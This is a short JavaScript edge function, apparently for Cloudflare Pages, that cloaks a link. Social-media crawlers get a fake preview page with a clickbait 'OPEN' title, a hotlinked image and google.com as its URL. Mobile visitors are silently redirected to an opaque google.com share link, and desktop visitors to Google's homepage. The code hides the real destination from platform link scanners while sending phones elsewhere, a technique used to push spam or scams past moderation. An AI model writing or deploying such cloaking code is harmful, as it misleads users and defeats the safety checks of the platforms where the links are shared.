export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="🎬O▂P▂▂E▂N🎬">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://www.gminsidenews.com/attachments/2-jpg.78199/?hash=414c399b9ba4d23d1b3c6f652f0ba19a">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://www.google.com/share.google?q=nNIxuAhTzh80F6hcT", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
